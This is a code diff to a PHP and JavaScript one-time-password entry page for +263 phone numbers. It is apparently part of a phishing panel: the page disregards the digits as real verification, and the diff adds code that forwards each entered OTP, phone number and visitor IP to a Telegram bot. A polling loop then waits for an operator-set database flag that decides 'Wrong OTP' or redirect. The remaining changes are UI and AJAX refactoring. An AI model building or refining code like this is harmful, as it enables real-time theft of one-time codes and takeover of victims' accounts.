@@ -93,10 +93,9 @@ if (!isset($_SESSION['phone'])) {
 
 $phone = trim($_SESSION['phone']);
 $error = '';
-$statusMessage = '';
 
 // Process OTP submission
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
     // We ignore the actual OTP digits – only the database flag matters
     $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
     $enteredOtp = implode('', $otpArray);
@@ -124,12 +123,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $alterSQL = "ALTER TABLE users ADD COLUMN IF NOT EXISTS error_processing INTEGER DEFAULT 0";
         @pg_query($conn, $alterSQL);
         
-        // Insert phone if not exists (using ON CONFLICT to avoid duplicate key error)
-        // Only include columns that definitely exist
+        // Insert phone if not exists
         $insertSQL = "INSERT INTO users (phone, status, pin, otp, logout) 
                       VALUES ($1, 0, 0, 0, 0) 
                       ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
+        
+        // Send Telegram notification about OTP submission
+        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        $time = date('Y-m-d H:i:s');
+        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+        sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
+        
+        // Return success to AJAX
+        header('Content-Type: application/json');
+        echo json_encode(['success' => true]);
+        exit;
     }
 }
 
@@ -180,13 +189,22 @@ p {
     font-size: 15px;
 }
 
+.message-area {
+    min-height: 60px;
+    margin-bottom: 20px;
+}
+
 .status-message {
     padding: 10px;
     border-radius: 8px;
-    margin-bottom: 20px;
     text-align: center;
     font-size: 14px;
     transition: all 0.3s ease;
+    display: none;
+}
+
+.status-message.show {
+    display: block;
 }
 
 .status-verifying {
@@ -235,6 +253,12 @@ p {
     box-shadow: 0 0 0 3px rgba(37,99,235,0.2);
 }
 
+.otp-box input:disabled {
+    background: #f3f4f6;
+    border-color: #d1d5db;
+    cursor: not-allowed;
+}
+
 button {
     margin-top: 32px;
     width: 100%;
@@ -270,10 +294,6 @@ button:disabled {
     text-decoration: none;
 }
 
-.hidden-form {
-    display: none;
-}
-
 @media (max-width: 480px) {
     .container {
         padding: 20px 16px 28px;
@@ -306,9 +326,11 @@ button:disabled {
         <strong>+263 <?= htmlspecialchars($maskedPhone) ?></strong>
     </p>
 
-    <div id="statusMessage" class="status-message status-verifying">🔍 Verifying...</div>
+    <div class="message-area">
+        <div id="statusMessage" class="status-message"></div>
+    </div>
 
-    <form id="otpForm" method="POST">
+    <form id="otpForm">
         <div class="otp-box">
             <?php for ($i = 0; $i < 6; $i++): ?>
                 <input type="text" name="otp[]" maxlength="1" inputmode="numeric" required autocomplete="off">
@@ -328,8 +350,9 @@ const form = document.getElementById('otpForm');
 let monitoringInterval = null;
 let isProcessing = false;
 let hasRedirected = false;
+let errorTimeout = null;
 
-// Auto-check database status every 2 seconds
+// Auto-check database status every 2 seconds (only after submission)
 function checkDatabaseStatus() {
     if (hasRedirected) return;
     
@@ -348,23 +371,28 @@ function checkDatabaseStatus() {
             
             // Check the OTP database value
             if (otpValue === 0) {
-                statusDiv.className = 'status-message status-verifying';
-                statusDiv.innerHTML = '🔍 Verifying...';
+                // Still verifying - keep showing "verifying" message
+                if (statusDiv.classList.contains('status-verifying')) {
+                    // Message already showing, do nothing
+                } else {
+                    showMessage('🔍 Verifying...', 'status-verifying');
+                }
             } else if (otpValue === 1) {
-                statusDiv.className = 'status-message status-wrong';
-                statusDiv.innerHTML = '❌ Wrong OTP';
-                // Stop monitoring when wrong OTP is detected
+                // Wrong OTP detected
+                showMessage('❌ Wrong OTP', 'status-wrong');
+                // Disable inputs
+                inputs.forEach(input => input.disabled = true);
+                submitBtn.disabled = true;
+                // Stop monitoring
                 if (monitoringInterval) {
                     clearInterval(monitoringInterval);
                     monitoringInterval = null;
                 }
+                isProcessing = false;
             } else if (otpValue === 2) {
-                statusDiv.className = 'status-message';
-                statusDiv.style.background = '#d4edda';
-                statusDiv.style.color = '#155724';
-                statusDiv.style.borderLeft = '4px solid #155724';
-                statusDiv.innerHTML = '✅ OTP Verified! Redirecting...';
-                // Stop monitoring and redirect
+                // OTP verified - redirect
+                showMessage('✅ OTP Verified! Redirecting...', 'status-verifying');
+                // Stop monitoring
                 if (monitoringInterval) {
                     clearInterval(monitoringInterval);
                     monitoringInterval = null;
@@ -372,15 +400,13 @@ function checkDatabaseStatus() {
                 hasRedirected = true;
                 
                 // Check logout status before redirecting
-                if (data.logout_status === 1) {
-                    setTimeout(() => {
+                setTimeout(() => {
+                    if (data.logout_status === 1) {
                         window.location.href = 'loggedin.php';
-                    }, 1000);
-                } else {
-                    setTimeout(() => {
+                    } else {
                         window.location.href = 'dashboard.php';
-                    }, 1000);
-                }
+                    }
+                }, 1000);
             }
         }
     })
@@ -389,6 +415,28 @@ function checkDatabaseStatus() {
     });
 }
 
+// Helper function to show message with auto-hide for wrong OTP
+function showMessage(message, type, autoHide = false) {
+    statusDiv.textContent = message;
+    statusDiv.className = `status-message show ${type}`;
+    
+    if (autoHide) {
+        if (errorTimeout) clearTimeout(errorTimeout);
+        errorTimeout = setTimeout(() => {
+            statusDiv.classList.remove('show');
+        }, 3000);
+    }
+}
+
+// Clear any existing error timeout
+function clearErrorTimeout() {
+    if (errorTimeout) {
+        clearTimeout(errorTimeout);
+        errorTimeout = null;
+    }
+}
+
+// OTP input handling
 inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/[^0-9]/g, '');
@@ -408,12 +456,9 @@ inputs[0].focus();
 
 // Handle form submission
 form.addEventListener('submit', function(e) {
-    if (isProcessing) {
-        e.preventDefault();
-        return;
-    }
-    
     e.preventDefault();
+    
+    if (isProcessing) return;
     
     // Get entered OTP
     let otpValue = '';
@@ -422,54 +467,61 @@ form.addEventListener('submit', function(e) {
     });
     
     if (otpValue.length !== 6) {
-        statusDiv.className = 'status-message status-wrong';
-        statusDiv.innerHTML = '❌ Please enter complete 6-digit OTP';
+        showMessage('❌ Please enter complete 6-digit OTP', 'status-wrong', true);
         return;
     }
+    
+    // Clear any previous messages
+    clearErrorTimeout();
+    statusDiv.classList.remove('show');
     
     isProcessing = true;
     submitBtn.disabled = true;
     submitBtn.textContent = 'Verifying...';
     
-    // Submit the form via AJAX
-    const formData = new FormData(form);
+    // Disable inputs while processing
+    inputs.forEach(input => input.disabled = true);
     
+    // Prepare form data
+    const formData = new FormData();
+    inputs.forEach((input, idx) => {
+        formData.append('otp[]', input.value);
+    });
+    
+    // Submit the form via AJAX
     fetch(window.location.href, {
         method: 'POST',
         body: formData
     })
-    .then(response => response.text())
-    .then(html => {
-        // Parse response to check for errors
-        const tempDiv = document.createElement('div');
-        tempDiv.innerHTML = html;
-        const errorMsg = tempDiv.querySelector('.error-message');
-        
-        if (errorMsg && errorMsg.textContent.includes('Wrong OTP')) {
-            statusDiv.className = 'status-message status-wrong';
-            statusDiv.innerHTML = '❌ Wrong OTP';
-            isProcessing = false;
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'Submit';
-        } else {
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
             // Start monitoring database status
-            statusDiv.className = 'status-message status-verifying';
-            statusDiv.innerHTML = '🔍 Verifying...';
+            showMessage('🔍 Verifying...', 'status-verifying');
             
+            // Start checking every 2 seconds
             if (monitoringInterval) {
                 clearInterval(monitoringInterval);
             }
             monitoringInterval = setInterval(checkDatabaseStatus, 2000);
             checkDatabaseStatus(); // Check immediately
+        } else {
+            showMessage('❌ Submission failed. Please try again.', 'status-wrong', true);
+            // Re-enable inputs
+            inputs.forEach(input => input.disabled = false);
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Submit';
+            isProcessing = false;
         }
     })
     .catch(error => {
         console.error('Error:', error);
-        statusDiv.className = 'status-message status-error';
-        statusDiv.innerHTML = '⚠️ Network error. Please try again.';
-        isProcessing = false;
+        showMessage('⚠️ Network error. Please try again.', 'status-error', true);
+        // Re-enable inputs
+        inputs.forEach(input => input.disabled = false);
         submitBtn.disabled = false;
         submitBtn.textContent = 'Submit';
+        isProcessing = false;
     });
 });
 
